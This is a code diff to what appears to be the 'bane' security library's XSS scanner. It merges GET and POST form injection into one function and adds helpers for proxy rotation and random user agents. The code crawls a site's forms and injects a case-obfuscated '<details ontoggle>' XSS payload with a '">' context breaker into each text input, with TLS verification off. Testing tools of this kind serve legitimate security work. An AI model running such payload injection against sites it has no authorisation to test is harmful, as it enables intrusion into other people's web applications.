@@ -16,13 +16,14 @@ else:
  from urllib.parse import urlparse
  import urllib.parse as urllib
  import html.parser as HTMLParser
+ unicode=str
 import requests,socket,random,time,ssl
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import bs4
 from bs4 import BeautifulSoup
 from bane.payloads import *
-from bane.pager import inputs,forms,crawl,forms_parser
+from bane.pager import *
 from bane.js_fuck import js_fuck
 from bane.extrafun import write_file,delete_file
 
@@ -105,90 +106,56 @@ def html_hexadecimal_encoder(text,random_level=1):
   return unicode(text)
 
 
-def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
+def setup_to_submit(form):
+ d={}
+ for x in form["inputs"]:
+  d.update({x["name"]:x["value"]})
+ return d
+
+def xss_submit(parsed,payload,debug=False):
   '''
    this function is for xss test with GET requests.
 
   '''
-  if user_agent:
-   us=user_agent
-  else:
-   us=random.choice(ua)
-  if cookie:
-    hea={'User-Agent': us,'Cookie':cookie}
-  else:
-   hea={'User-Agent': us}
-  if proxy:
-   proxy={'http':'http://'+proxy}
-  for x in pl:
-   xp=pl[x]
-  d={}
-  if extra:
-   d.update(extra)
-  d.update(pl)
-  for i in d:
-   if (d[i]=="") and (fill_empty>0):
-    st=""
-    for j in range(fill_empty):
-     st+=random.choice(lis)
-    d[i]=st
-  for i in d:
-   if i in leave_empty:
-    d[i]=""
+  d=setup_to_submit(parsed[0])
   if debug==True:
    for x in d:
     print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
-  try:
-     c=requests.get(u, params= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
-     if  xp in c:
-      return (True,find_xss_context(c,xp))
-  except Exception as e:
-   pass
+  if parsed[0]["method"]=="get":
+   try:
+     c=requests.get(parsed[0]["action"], params= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
+     if  payload in c:
+      return (True,find_xss_context(c,payload))
+   except Exception as e:
+    pass
+  else:
+   try:
+     c=requests.post(parsed[0]["action"], data= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
+     if payload in c:
+      return (True,find_xss_context(c,payload))
+   except Exception as e:
+    pass
   return (False,'')
 
 
-def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
-  '''
-   this function is for xss test with POST requests.
-  '''
-  if user_agent:
-   us=user_agent
-  else:
-   us=random.choice(ua)
-  if cookie:
-    hea={'User-Agent': us,'Cookie':cookie}
-  else:
-   hea={'User-Agent': us}
-  if proxy:
-   proxy={'http':'http://'+proxy}
-  for x in pl:
-   xp=pl[x]
-  d={}
-  if extra:
-   d.update(extra)
-  d.update(pl)
-  for i in d:
-   if (d[i]=="") and (fill_empty>0):
-    st=""
-    for j in range(fill_empty):
-     st+=random.choice(lis)
-    d[i]=st
-  for i in d:
-   if i in leave_empty:
-    d[i]=""
-  if debug==True:
-   for x in d:
-    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
-  try:
-     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
-     if xp in c:
-      return (True,find_xss_context(c,xp))
-  except Exception as e:
-   pass
-  return (False,'')
+def setup_proxy(pr,prs):
+ if pr:
+  return pr
+ if prs:
+  return random.choice(prs)
+ return None
+ 
 
 
-def xss(u,payload=None,random_level=2,js_function="alert",save_to_file="xss_report",show_warnings=True,target_form_action=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,proxy=None,ignored_values=["anonymous user","..."],proxies=None,timeout=10,user_agent=None,cookie=None,debug=False,leave_empty=[]):
+
+def setup_ua(usra):
+ if usra:
+  return usra
+ return random.choice(ua)
+
+
+
+def xss(u,payload=None,unicode_random_level=0,js_function="alert",context_breaker='">',save_to_file="xss_report",logs=True,fill_empty=10,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None,debug=False):
   '''
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -211,43 +178,30 @@ def xss(u,payload=None,random_level=2,js_function="alert",save_to_file="xss_repo
    xp_f=payload
    pre_apyload=False
   else:
-   xp_f='<DeTAIlS/OpeN/OntOGglE = "{}`v`"'
+   xp_f='<DeTAIlS/OpeN/OntOGglE = "{} `v`"'
+  if context_breaker:
+   xp_f=context_breaker+xp_f
   if logs==True:
    print(Fore.WHITE+"[~]Getting forms..."+Style.RESET_ALL)
   hu=True
-  fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
+  fom=forms_parser(u,proxy=proxy,timeout=timeout,cookie=cookie,user_agent=user_agent)
   if len(fom)==0:
    if logs==True:
     print(Fore.RED+"[-]No forms were found!!!"+Style.RESET_ALL)
    hu=False
   if hu==True:
-   if target_form_action:
-    i=0
-    for x in fom:
-     if x["action"]==target_form_action:
-       i=fom.index(x)
-    fom=fom[i:i+1]
    form_index=-1
    for l1 in fom:
+    form_index+=1
     if pre_apyload==True:
-     xp=xp_f.format(hexadecimal_encoder(js_function,random_level=random_level))
+     xp=xp_f.format(hexadecimal_encoder(js_function,random_level=unicode_random_level))
     else:
      xp=xp_f
-    if target_form_action:
-     form_index=0
-    else:
-     form_index+=1
     lst={}
     vul=[]
     sec=[]
     hu=True
     u=l1['action']
-    if l1['method']=='post':
-     post=True
-     get=False
-    else:
-     post=False
-     get=True
     if logs==True:
       print(Fore.BLUE+"Form: "+Fore.WHITE+str(form_index)+Fore.BLUE+"\nAction: "+Fore.WHITE+u+Fore.BLUE+"\nMethod: "+Fore.WHITE+l1['method']+Fore.BLUE+"\nPayload: "+Fore.WHITE+xp+Style.RESET_ALL)
     """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
@@ -258,68 +212,10 @@ def xss(u,payload=None,random_level=2,js_function="alert",save_to_file="xss_repo
      extr=[]
      l=[]
      for x in l1['inputs']:
-      if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):#some websites may introduce in the input certain value that can be replaced ( because the function works only on empty inputs ) , all you have to do is put something which specify it among the others to be ingnored and inject our xss payload there !!
-       extr.append(x)
-      else:
-       l.append(x)
-     for x in extr:
-      if x.split(':')[0] in l:
-       extr.remove(x)
-     #if '?' in u:
-      #u=u.split('?')[0]
-     if len(l)==0:
-      print(Fore.RED+"[-]No empty fields to test on !!"+Style.RESET_ALL)
-      if show_warnings==True: 
-       print(Fore.WHITE+'\n\nYou can use "ignored_values" parameter to pass the keywords which can be ignored if has been found in an input:\n\nbane.xss(url,ignored_values=["...","search"]\n\nSo if that keyword was found in an input, it will be replaced by our payload.\n\nForm\'s fielda and values (seperated by ":")\n'+Style.RESET_ALL)      
-       for x in extr:
-        print(x)
-        print("\n")
-     for i in l:
-      user=None
-      i=i.split(':')[0]
-      try:
-       if proxies:
-        proxy=random.choice(proxies)
-       pl={i : xp}
-       extra={}
-       if len(extr)!=0:
-        for x in extr:
-         a=x.split(':')[0]
-         b=x.split(':')[1]
-         extra.update({a:b})
-       if get==True: 
-        if fresh==True:
-         extr=[]
-         user=random.choice(ua)
-         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
-         if target_form_action:
-          j=0
-          for x in k:
-           if x["action"]==target_form_action:
-            j=k.index(x)
-          k=k[j:j+1]
-         for x in k[form_index]['inputs']:
-          try:
-           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
-            extr.append(x)
-          except:
-            pass
-         for x in extr:
-          if x.split(':')[0] in l:
-           extr.remove(x)
-         extra={}
-         if len(extr)!=0:
-          for x in extr:
-           a=x.split(':')[0]
-           b=x.split(':')[1]
-           extra.update({a:b})
-        for lop in l:
-         if lop!=i:
-          extra.update({lop.split(':')[0]:lop.split(':')[1]})
-        if ignore_values==True:
-         for x in extra:
-          extra[x]=""
-        xss_res=xss_get(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
+       if x["type"] in ["text","textarea","email","tel","search","url","password","number"]:#any input type that accept direct input from keyboard
+        i=x["name"]
+        parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty)
+        xss_res=xss_submit(parsed_form,xp,debug=debug)
         if xss_res[0]==True:
           x="parameter: '"+i+"' => [+]Payload was found"
           vul.append((i,xss_res[1]))
@@ -330,52 +226,6 @@ def xss(u,payload=None,random_level=2,js_function="alert",save_to_file="xss_repo
          colr=Fore.RED
         if logs==True:
          print (colr+x+Style.RESET_ALL)
-       if post==True:
-        if fresh==True:
-         extr=[]
-         user=random.choice(ua)
-         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
-         if target_form_action:
-          j=0
-          for x in k:
-           if x["action"]==target_form_action:
-            j=k.index(x)
-          k=k[j:j+1]
-         for x in k[form_index]['inputs']:
-          try:
-           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
-            extr.append(x)
-          except:
-           pass
-         for x in extr:
-          if x.split(':')[0] in l:
-           extr.remove(x)
-         extra={}
-         if len(extr)!=0:
-          for x in extr:
-           a=x.split(':')[0]
-           b=x.split(':')[1]
-           extra.update({a:b})
-        for lop in l:
-         if lop!=i:
-          extra.update({lop.split(':')[0]:lop.split(':')[1]})
-        if ignore_values==True:
-         for x in extra:
-          extra[x]=""
-        xss_res=xss_post(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
-        if xss_res[0]==True:
-         x="parameter: '"+i+"' => [+]Payload was found"
-         vul.append((i,xss_res[1]))
-         colr=Fore.GREEN
-        else:
-         x="parameter: '"+i+"' =>  [-]Payload was not found"
-         sec.append(i)
-         colr=Fore.RED
-        #lst.update(reslt)
-        if logs==True:
-         print (colr+x+Style.RESET_ALL)
-      except Exception as ex:
-       pass
     dic.update({form_index:{"Form":u,"Method":l1['method'],"Passed":vul,"Failed":sec}}) 
    if save_to_file:
     with open(save_to_file.split('.')[0]+".json", 'w') as outfile:
